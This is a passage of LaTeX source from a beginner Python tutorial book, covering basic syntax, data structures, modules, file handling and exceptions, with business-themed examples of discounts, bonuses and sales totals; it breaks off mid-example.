\end{Shaded}

\subsubsection{Adding and Removing Key-Value
Pairs}\label{adding-and-removing-key-value-pairs}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{employee[}\StringTok{"salary"}\NormalTok{] }\OperatorTok{=} \DecValTok{70000}  \CommentTok{\# Adding a new key{-}value pair}
\KeywordTok{del}\NormalTok{ employee[}\StringTok{"age"}\NormalTok{]         }\CommentTok{\# Removing a key{-}value pair}
\BuiltInTok{print}\NormalTok{(employee)  }\CommentTok{\# Output: \{\textquotesingle{}name\textquotesingle{}: \textquotesingle{}John Doe\textquotesingle{}, \textquotesingle{}position\textquotesingle{}: \textquotesingle{}Data Analyst\textquotesingle{}, \textquotesingle{}salary\textquotesingle{}: 70000\}}
\end{Highlighting}
\end{Shaded}

\subsection{Basic Modules and
Importing}\label{basic-modules-and-importing}

Python has a rich standard library of modules you can import to extend
functionality.

\subsubsection{Importing Modules}\label{importing-modules}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ math}

\CommentTok{\# Calculating the ceiling value of monthly earnings}
\NormalTok{monthly\_earnings }\OperatorTok{=} \FloatTok{10234.56}
\BuiltInTok{print}\NormalTok{(math.ceil(monthly\_earnings))  }\CommentTok{\# Output: 10235}
\end{Highlighting}
\end{Shaded}

\subsubsection{Importing Specific
Functions}\label{importing-specific-functions}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ math }\ImportTok{import}\NormalTok{ sqrt}

\CommentTok{\# Calculating the square root of the annual growth percentage}
\NormalTok{annual\_growth }\OperatorTok{=} \DecValTok{16}
\BuiltInTok{print}\NormalTok{(sqrt(annual\_growth))  }\CommentTok{\# Output: 4.0}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion}

This tutorial covered the basics of Python programming with a focus on
business-related examples, including variables, data types, control
structures, functions, lists, dictionaries, and basic module usage. With
these fundamentals, you can start building simple Python programs to
solve business problems and gradually move on to more complex projects.

\bookmarksetup{startatroot}

\chapter{Deep Dive Tutorial into Python
Basics}\label{deep-dive-tutorial-into-python-basics}

Python is a high-level, interpreted programming language known for its
readability, simplicity, and versatility. It is widely used for web
development, data analysis, artificial intelligence, scientific
computing, and more. This tutorial provides a comprehensive introduction
to the basics of Python, covering essential concepts and practical
examples.

\section{Table of Contents}\label{table-of-contents}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-python]{Introduction to Python}
\item
  \hyperref[installing-python]{Installing Python}
\item
  \hyperref[running-python-programs]{Running Python Programs}
\item
  \hyperref[python-syntax-and-semantics]{Python Syntax and Semantics}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[indentation]{Indentation}
  \item
    \hyperref[comments]{Comments}
  \end{itemize}
\item
  \hyperref[variables-and-data-types]{Variables and Data Types}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[numbers]{Numbers}
  \item
    \hyperref[strings]{Strings}
  \item
    \hyperref[booleans]{Booleans}
  \item
    \hyperref[none]{None}
  \end{itemize}
\item
  \hyperref[operators]{Operators}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[arithmetic-operators]{Arithmetic Operators}
  \item
    \hyperref[comparison-operators]{Comparison Operators}
  \item
    \hyperref[logical-operators]{Logical Operators}
  \item
    \hyperref[assignment-operators]{Assignment Operators}
  \item
    \hyperref[membership-operators]{Membership Operators}
  \item
    \hyperref[identity-operators]{Identity Operators}
  \end{itemize}
\item
  \hyperref[control-flow]{Control Flow}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[conditional-statements]{Conditional Statements}
  \item
    \hyperref[loops]{Loops}
  \end{itemize}
\item
  \hyperref[functions]{Functions}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[defining-functions]{Defining Functions}
  \item
    \hyperref[function-arguments]{Function Arguments}
  \item
    \hyperref[return-values]{Return Values}
  \end{itemize}
\item
  \hyperref[data-structures]{Data Structures}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[lists]{Lists}
  \item
    \hyperref[tuples]{Tuples}
  \item
    \hyperref[sets]{Sets}
  \item
    \hyperref[dictionaries]{Dictionaries}
  \end{itemize}
\item
  \hyperref[modules-and-packages]{Modules and Packages}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[importing-modules]{Importing Modules}
  \item
    \hyperref[creating-modules]{Creating Modules}
  \item
    \hyperref[using-packages]{Using Packages}
  \end{itemize}
\item
  \hyperref[file-handling]{File Handling}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[reading-files]{Reading Files}
  \item
    \hyperref[writing-files]{Writing Files}
  \end{itemize}
\item
  \hyperref[exception-handling]{Exception Handling}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to Python}\label{introduction-to-python}

Python was created by Guido van Rossum and first released in 1991. It
emphasizes code readability and allows programmers to express concepts
in fewer lines of code than languages like C++ or Java. Python supports
multiple programming paradigms, including procedural, object-oriented,
and functional programming.

\section{Installing Python}\label{installing-python-1}

To install Python, download the installer from the
\href{https://www.python.org/downloads/}{official Python website} and
follow the installation instructions for your operating system.

\section{Running Python Programs}\label{running-python-programs}

Python programs can be run in various ways: - \textbf{Interactive Mode}:
Open a terminal or command prompt, type \texttt{python} or
\texttt{python3}, and press Enter. - \textbf{Script Mode}: Write your
code in a file with a \texttt{.py} extension and run it using
\texttt{python\ filename.py} or \texttt{python3\ filename.py}.

\section{Python Syntax and Semantics}\label{python-syntax-and-semantics}

\subsection{Indentation}\label{indentation}

Python uses indentation to define the structure of the code. Consistent
indentation is crucial as it defines blocks of code.

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{if} \DecValTok{5} \OperatorTok{\textgreater{}} \DecValTok{2}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Five is greater than two!"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Comments}\label{comments}

Comments are used to explain code and are ignored by the interpreter.
Single-line comments start with \texttt{\#}.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# This is a comment}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Hello, World!"}\NormalTok{)  }\CommentTok{\# This is an inline comment}
\end{Highlighting}
\end{Shaded}

\section{Variables and Data Types}\label{variables-and-data-types-1}

Variables are used to store data values. In Python, you don't need to
declare variables before using them.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{x }\OperatorTok{=} \DecValTok{5}
\NormalTok{y }\OperatorTok{=} \StringTok{"Hello"}
\end{Highlighting}
\end{Shaded}

\subsection{Numbers}\label{numbers}

Python supports integers, floating-point numbers, and complex numbers.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{a }\OperatorTok{=} \DecValTok{10}       \CommentTok{\# Integer}
\NormalTok{b }\OperatorTok{=} \FloatTok{3.14}     \CommentTok{\# Float}
\NormalTok{c }\OperatorTok{=} \DecValTok{1} \OperatorTok{+} \OtherTok{2j}   \CommentTok{\# Complex}
\end{Highlighting}
\end{Shaded}

\subsection{Strings}\label{strings}

Strings are sequences of characters enclosed in single, double, or
triple quotes.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{name }\OperatorTok{=} \StringTok{"Alice"}
\NormalTok{greeting }\OperatorTok{=} \StringTok{\textquotesingle{}Hello, World!\textquotesingle{}}
\NormalTok{multiline }\OperatorTok{=} \StringTok{"""This is}
\StringTok{a multiline}
\StringTok{string."""}
\end{Highlighting}
\end{Shaded}

\subsection{Booleans}\label{booleans}

Booleans represent \texttt{True} or \texttt{False}.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{is\_true }\OperatorTok{=} \VariableTok{True}
\NormalTok{is\_false }\OperatorTok{=} \VariableTok{False}
\end{Highlighting}
\end{Shaded}

\subsection{None}\label{none}

\texttt{None} represents the absence of a value.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{nothing }\OperatorTok{=} \VariableTok{None}
\end{Highlighting}
\end{Shaded}

\section{Operators}\label{operators}

\subsection{Arithmetic Operators}\label{arithmetic-operators}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{x }\OperatorTok{=} \DecValTok{10}
\NormalTok{y }\OperatorTok{=} \DecValTok{3}
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{+}\NormalTok{ y)  }\CommentTok{\# Addition}
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{{-}}\NormalTok{ y)  }\CommentTok{\# Subtraction}
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{*}\NormalTok{ y)  }\CommentTok{\# Multiplication}
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{/}\NormalTok{ y)  }\CommentTok{\# Division}
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{\%}\NormalTok{ y)  }\CommentTok{\# Modulus}
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{**}\NormalTok{ y) }\CommentTok{\# Exponentiation}
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{//}\NormalTok{ y) }\CommentTok{\# Floor Division}
\end{Highlighting}
\end{Shaded}

\subsection{Comparison Operators}\label{comparison-operators}

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{==}\NormalTok{ y)  }\CommentTok{\# Equal}
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{!=}\NormalTok{ y)  }\CommentTok{\# Not equal}
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{\textgreater{}}\NormalTok{ y)   }\CommentTok{\# Greater than}
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{\textless{}}\NormalTok{ y)   }\CommentTok{\# Less than}
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{\textgreater{}=}\NormalTok{ y)  }\CommentTok{\# Greater than or equal to}
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{\textless{}=}\NormalTok{ y)  }\CommentTok{\# Less than or equal to}
\end{Highlighting}
\end{Shaded}

\subsection{Logical Operators}\label{logical-operators}

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{\textgreater{}} \DecValTok{5} \KeywordTok{and}\NormalTok{ y }\OperatorTok{\textless{}} \DecValTok{5}\NormalTok{)  }\CommentTok{\# Logical AND}
\BuiltInTok{print}\NormalTok{(x }\OperatorTok{\textgreater{}} \DecValTok{5} \KeywordTok{or}\NormalTok{ y }\OperatorTok{\textgreater{}} \DecValTok{5}\NormalTok{)   }\CommentTok{\# Logical OR}
\BuiltInTok{print}\NormalTok{(}\KeywordTok{not}\NormalTok{(x }\OperatorTok{\textgreater{}} \DecValTok{5}\NormalTok{))       }\CommentTok{\# Logical NOT}
\end{Highlighting}
\end{Shaded}

\subsection{Assignment Operators}\label{assignment-operators}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{x }\OperatorTok{=} \DecValTok{10}
\NormalTok{x }\OperatorTok{+=} \DecValTok{5}  \CommentTok{\# x = x + 5}
\NormalTok{x }\OperatorTok{{-}=} \DecValTok{3}  \CommentTok{\# x = x {-} 3}
\NormalTok{x }\OperatorTok{*=} \DecValTok{2}  \CommentTok{\# x = x * 2}
\NormalTok{x }\OperatorTok{/=} \DecValTok{2}  \CommentTok{\# x = x / 2}
\NormalTok{x }\OperatorTok{\%=} \DecValTok{3}  \CommentTok{\# x = x \% 3}
\NormalTok{x }\OperatorTok{**=} \DecValTok{2} \CommentTok{\# x = x ** 2}
\NormalTok{x }\OperatorTok{//=} \DecValTok{2} \CommentTok{\# x = x // 2}
\end{Highlighting}
\end{Shaded}

\subsection{Membership Operators}\label{membership-operators}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{lst }\OperatorTok{=}\NormalTok{ [}\DecValTok{1}\NormalTok{, }\DecValTok{2}\NormalTok{, }\DecValTok{3}\NormalTok{, }\DecValTok{4}\NormalTok{, }\DecValTok{5}\NormalTok{]}
\BuiltInTok{print}\NormalTok{(}\DecValTok{3} \KeywordTok{in}\NormalTok{ lst)  }\CommentTok{\# True}
\BuiltInTok{print}\NormalTok{(}\DecValTok{6} \KeywordTok{in}\NormalTok{ lst)  }\CommentTok{\# False}
\BuiltInTok{print}\NormalTok{(}\DecValTok{6} \KeywordTok{not} \KeywordTok{in}\NormalTok{ lst)  }\CommentTok{\# True}
\end{Highlighting}
\end{Shaded}

\subsection{Identity Operators}\label{identity-operators}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{a }\OperatorTok{=}\NormalTok{ [}\DecValTok{1}\NormalTok{, }\DecValTok{2}\NormalTok{, }\DecValTok{3}\NormalTok{]}
\NormalTok{b }\OperatorTok{=}\NormalTok{ [}\DecValTok{1}\NormalTok{, }\DecValTok{2}\NormalTok{, }\DecValTok{3}\NormalTok{]}
\BuiltInTok{print}\NormalTok{(a }\KeywordTok{is}\NormalTok{ b)      }\CommentTok{\# False (different objects)}
\BuiltInTok{print}\NormalTok{(a }\KeywordTok{is} \KeywordTok{not}\NormalTok{ b)  }\CommentTok{\# True}
\BuiltInTok{print}\NormalTok{(a }\OperatorTok{==}\NormalTok{ b)      }\CommentTok{\# True (same content)}
\end{Highlighting}
\end{Shaded}

\section{Control Flow}\label{control-flow}

\subsection{Conditional Statements}\label{conditional-statements-1}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{x }\OperatorTok{=} \DecValTok{10}

\ControlFlowTok{if}\NormalTok{ x }\OperatorTok{\textgreater{}} \DecValTok{0}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"x is positive"}\NormalTok{)}
\ControlFlowTok{elif}\NormalTok{ x }\OperatorTok{==} \DecValTok{0}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"x is zero"}\NormalTok{)}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"x is negative"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Loops}\label{loops-1}

\subsubsection{\texorpdfstring{\texttt{for}
Loop}{for Loop}}\label{for-loop-1}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{fruits }\OperatorTok{=}\NormalTok{ [}\StringTok{"apple"}\NormalTok{, }\StringTok{"banana"}\NormalTok{, }\StringTok{"cherry"}\NormalTok{]}
\ControlFlowTok{for}\NormalTok{ fruit }\KeywordTok{in}\NormalTok{ fruits:}
    \BuiltInTok{print}\NormalTok{(fruit)}
\end{Highlighting}
\end{Shaded}

\subsubsection{\texorpdfstring{\texttt{while}
Loop}{while Loop}}\label{while-loop-1}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{i }\OperatorTok{=} \DecValTok{1}
\ControlFlowTok{while}\NormalTok{ i }\OperatorTok{\textless{}} \DecValTok{6}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(i)}
\NormalTok{    i }\OperatorTok{+=} \DecValTok{1}
\end{Highlighting}
\end{Shaded}

\subsubsection{Loop Control Statements}\label{loop-control-statements}

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{for}\NormalTok{ i }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{10}\NormalTok{):}
    \ControlFlowTok{if}\NormalTok{ i }\OperatorTok{==} \DecValTok{5}\NormalTok{:}
        \ControlFlowTok{break}  \CommentTok{\# Exit the loop}
    \ControlFlowTok{if}\NormalTok{ i }\OperatorTok{\%} \DecValTok{2} \OperatorTok{==} \DecValTok{0}\NormalTok{:}
        \ControlFlowTok{continue}  \CommentTok{\# Skip the rest of the loop}
    \BuiltInTok{print}\NormalTok{(i)}
\end{Highlighting}
\end{Shaded}

\section{Functions}\label{functions-1}

\subsection{Defining Functions}\label{defining-functions}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ greet(name):}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Hello, }\SpecialCharTok{\{}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{!"}\NormalTok{)}
\NormalTok{greet(}\StringTok{"Alice"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Function Arguments}\label{function-arguments}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ add(a, b):}
    \ControlFlowTok{return}\NormalTok{ a }\OperatorTok{+}\NormalTok{ b}

\BuiltInTok{print}\NormalTok{(add(}\DecValTok{3}\NormalTok{, }\DecValTok{5}\NormalTok{))  }\CommentTok{\# Positional arguments}
\BuiltInTok{print}\NormalTok{(add(a}\OperatorTok{=}\DecValTok{3}\NormalTok{, b}\OperatorTok{=}\DecValTok{5}\NormalTok{))  }\CommentTok{\# Keyword arguments}

\KeywordTok{def}\NormalTok{ greet(name, message}\OperatorTok{=}\StringTok{"Hello"}\NormalTok{):}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"}\SpecialCharTok{\{}\NormalTok{message}\SpecialCharTok{\}}\SpecialStringTok{, }\SpecialCharTok{\{}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{!"}\NormalTok{)}
\NormalTok{greet(}\StringTok{"Alice"}\NormalTok{)}
\NormalTok{greet(}\StringTok{"Bob"}\NormalTok{, }\StringTok{"Hi"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Return Values}\label{return-values}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ square(x):}
    \ControlFlowTok{return}\NormalTok{ x }\OperatorTok{*}\NormalTok{ x}

\NormalTok{result }\OperatorTok{=}\NormalTok{ square(}\DecValTok{4}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(result)}
\end{Highlighting}
\end{Shaded}

\section{Data Structures}\label{data-structures}

\subsection{Lists}\label{lists-1}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{fruits }\OperatorTok{=}\NormalTok{ [}\StringTok{"apple"}\NormalTok{, }\StringTok{"banana"}\NormalTok{, }\StringTok{"cherry"}\NormalTok{]}
\BuiltInTok{print}\NormalTok{(fruits[}\DecValTok{0}\NormalTok{])  }\CommentTok{\# Accessing elements}
\NormalTok{fruits[}\DecValTok{1}\NormalTok{] }\OperatorTok{=} \StringTok{"blackberry"}  \CommentTok{\# Modifying elements}
\BuiltInTok{print}\NormalTok{(fruits)}
\NormalTok{fruits.append(}\StringTok{"orange"}\NormalTok{)  }\CommentTok{\# Adding elements}
\BuiltInTok{print}\NormalTok{(fruits)}
\end{Highlighting}
\end{Shaded}

\subsection{Tuples}\label{tuples}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{coordinates }\OperatorTok{=}\NormalTok{ (}\DecValTok{10}\NormalTok{, }\DecValTok{20}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(coordinates[}\DecValTok{0}\NormalTok{])}
\CommentTok{\# coordinates[0] = 30  \# Error: Tuples are immutable}
\end{Highlighting}
\end{Shaded}

\subsection{Sets}\label{sets}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{unique\_numbers }\OperatorTok{=}\NormalTok{ \{}\DecValTok{1}\NormalTok{, }\DecValTok{2}\NormalTok{, }\DecValTok{3}\NormalTok{, }\DecValTok{3}\NormalTok{, }\DecValTok{4}\NormalTok{\}}
\BuiltInTok{print}\NormalTok{(unique\_numbers)  }\CommentTok{\# \{1, 2, 3, 4\}}
\NormalTok{unique\_numbers.add(}\DecValTok{5}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(unique\_numbers)}
\end{Highlighting}
\end{Shaded}

\subsection{Dictionaries}\label{dictionaries-1}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{person }\OperatorTok{=}\NormalTok{ \{}\StringTok{"name"}\NormalTok{: }\StringTok{"Alice"}\NormalTok{, }\StringTok{"age"}\NormalTok{: }\DecValTok{30}\NormalTok{\}}
\BuiltInTok{print}\NormalTok{(person[}\StringTok{"name"}\NormalTok{])}
\NormalTok{person[}\StringTok{"age"}\NormalTok{] }\OperatorTok{=} \DecValTok{31}
\BuiltInTok{print}\NormalTok{(person)}
\NormalTok{person[}\StringTok{"city"}\NormalTok{] }\OperatorTok{=} \StringTok{"New York"}
\BuiltInTok{print}\NormalTok{(person)}
\end{Highlighting}
\end{Shaded}

\section{Modules and Packages}\label{modules-and-packages}

\subsection{Importing Modules}\label{importing-modules-1}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ math}
\BuiltInTok{print}\NormalTok{(math.sqrt(}\DecValTok{16}\NormalTok{))}

\ImportTok{from}\NormalTok{ math }\ImportTok{import}\NormalTok{ sqrt}
\BuiltInTok{print}\NormalTok{(sqrt(}\DecValTok{16}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsection{Creating Modules}\label{creating-modules}

Create a file named \texttt{mymodule.py}:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# mymodule.py}
\KeywordTok{def}\NormalTok{ greet(name):}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Hello, }\SpecialCharTok{\{}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{!"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

Then import and use it:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ mymodule}
\NormalTok{mymodule.greet(}\StringTok{"Alice"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Using Packages}\label{using-packages}

Create a package directory structure:

\begin{verbatim}
mypackage/
    __

init__.py
    module1.py
    module2.py
\end{verbatim}

In \texttt{module1.py}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ function1():}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Function 1 from module 1"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

In \texttt{module2.py}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ function2():}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Function 2 from module 2"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

In \texttt{\_\_init\_\_.py}:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ .module1 }\ImportTok{import}\NormalTok{ function1}
\ImportTok{from}\NormalTok{ .module2 }\ImportTok{import}\NormalTok{ function2}
\end{Highlighting}
\end{Shaded}

Then use the package:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ mypackage}
\NormalTok{mypackage.function1()}
\NormalTok{mypackage.function2()}
\end{Highlighting}
\end{Shaded}

\section{File Handling}\label{file-handling}

\subsection{Reading Files}\label{reading-files}

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}file.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    content }\OperatorTok{=} \BuiltInTok{file}\NormalTok{.read()}
    \BuiltInTok{print}\NormalTok{(content)}
\end{Highlighting}
\end{Shaded}

\subsection{Writing Files}\label{writing-files}

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}file.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
    \BuiltInTok{file}\NormalTok{.write(}\StringTok{"Hello, World!"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Exception Handling}\label{exception-handling}

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    x }\OperatorTok{=} \DecValTok{1} \OperatorTok{/} \DecValTok{0}
\ControlFlowTok{except} \PreprocessorTok{ZeroDivisionError}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Cannot divide by zero"}\NormalTok{)}
\ControlFlowTok{finally}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"This is always executed"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Conclusion}\label{conclusion-1}

This deep dive tutorial covered the basics of Python, including syntax,
data types, operators, control flow, functions, data structures,
modules, file handling, and exception handling. By mastering these
fundamentals, you'll be well-equipped to explore more advanced topics
and develop robust Python applications. Python's simplicity and
readability make it an excellent choice for beginners and experienced
developers alike.

\bookmarksetup{startatroot}

\chapter{Python Control Structures for Business
Applications}\label{python-control-structures-for-business-applications}

Control structures in Python allow you to control the flow of your
program based on conditions and loops. This tutorial will focus on using
control structures in business-related scenarios, including if
statements, for loops, and while loops.

\subsection{Conditional Statements}\label{conditional-statements-2}

Conditional statements execute code based on whether a condition is true
or false.

\subsubsection{If Statements}\label{if-statements}

If statements are used to execute a block of code only if a specified
condition is true.

\paragraph{Example: Discount
Calculation}\label{example-discount-calculation}

Let's say you want to apply a discount to a product based on the
purchase quantity.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{quantity }\OperatorTok{=} \DecValTok{15}
\NormalTok{unit\_price }\OperatorTok{=} \DecValTok{100}
\NormalTok{total\_cost }\OperatorTok{=}\NormalTok{ quantity }\OperatorTok{*}\NormalTok{ unit\_price}

\ControlFlowTok{if}\NormalTok{ quantity }\OperatorTok{\textgreater{}} \DecValTok{10}\NormalTok{:}
\NormalTok{    discount }\OperatorTok{=} \FloatTok{0.1}  \CommentTok{\# 10\% discount}
\NormalTok{    total\_cost }\OperatorTok{*=}\NormalTok{ (}\DecValTok{1} \OperatorTok{{-}}\NormalTok{ discount)}

\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Total cost after discount: $}\SpecialCharTok{\{}\NormalTok{total\_cost}\SpecialCharTok{:.2f\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{If-Else Statements}\label{if-else-statements}

If-else statements provide an alternative block of code to execute if
the condition is false.

\paragraph{Example: Determine Employee Bonus
Eligibility}\label{example-determine-employee-bonus-eligibility}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{employee\_performance }\OperatorTok{=} \StringTok{"Excellent"}
\NormalTok{bonus }\OperatorTok{=} \DecValTok{0}

\ControlFlowTok{if}\NormalTok{ employee\_performance }\OperatorTok{==} \StringTok{"Excellent"}\NormalTok{:}
\NormalTok{    bonus }\OperatorTok{=} \DecValTok{1000}
\ControlFlowTok{else}\NormalTok{:}
\NormalTok{    bonus }\OperatorTok{=} \DecValTok{500}

\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Employee bonus: $}\SpecialCharTok{\{}\NormalTok{bonus}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Elif Statements}\label{elif-statements}

Elif statements are used to check multiple conditions.

\paragraph{Example: Categorize Sales
Performance}\label{example-categorize-sales-performance}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{monthly\_sales }\OperatorTok{=} \DecValTok{75000}

\ControlFlowTok{if}\NormalTok{ monthly\_sales }\OperatorTok{\textgreater{}=} \DecValTok{100000}\NormalTok{:}
\NormalTok{    performance\_category }\OperatorTok{=} \StringTok{"Outstanding"}
\ControlFlowTok{elif}\NormalTok{ monthly\_sales }\OperatorTok{\textgreater{}=} \DecValTok{75000}\NormalTok{:}
\NormalTok{    performance\_category }\OperatorTok{=} \StringTok{"Good"}
\ControlFlowTok{elif}\NormalTok{ monthly\_sales }\OperatorTok{\textgreater{}=} \DecValTok{50000}\NormalTok{:}
\NormalTok{    performance\_category }\OperatorTok{=} \StringTok{"Average"}
\ControlFlowTok{else}\NormalTok{:}
\NormalTok{    performance\_category }\OperatorTok{=} \StringTok{"Needs Improvement"}

\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Sales performance: }\SpecialCharTok{\{}\NormalTok{performance\_category}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Loops}\label{loops-2}

Loops allow you to repeat a block of code multiple times.

\subsubsection{For Loops}\label{for-loops}

For loops are used to iterate over a sequence (such as a list, tuple, or
range).

\paragraph{Example: Calculate Total Revenue from Sales
Data}\label{example-calculate-total-revenue-from-sales-data}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{sales\_data }\OperatorTok{=}\NormalTok{ [}\DecValTok{1000}\NormalTok{, }\DecValTok{2000}\NormalTok{, }\DecValTok{1500}\NormalTok{, }\DecValTok{3000}\NormalTok{, }\DecValTok{2500}\NormalTok{]}
\NormalTok{total\_revenue }\OperatorTok{=} \DecValTok{0}

\ControlFlowTok{for}\NormalTok{ sale }\KeywordTok{in}\NormalTok{ sales\_data:}
\NormalTok{    total\_revenue }\OperatorTok{+=}\NormalTok{ sale}

\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Total revenue: $}\SpecialCharTok{\{}\NormalTok{total\_revenue}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\paragraph{Example: Generate Quarterly Sales
Report}\label{example-generate-quarterly-sales-report}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{quarterly\_sales }\OperatorTok{=}\NormalTok{ \{}
    \StringTok{"Q1"}\NormalTok{: }\DecValTok{20000}\NormalTok{,}
    \StringTok{"Q2"}\NormalTok{: }\DecValTok{25000}\NormalTok{,}
    \StringTok{"Q3"}\NormalTok{: }\DecValTok{30000}\NormalTok{,}
    \StringTok{"Q4"}\NormalTok{: }\DecValTok{35000}
\NormalTok{\}}

\ControlFlowTok{for}\NormalTok{ quarter, sales }\KeywordTok{in}\NormalTok{ quarterly\_sales.items():}
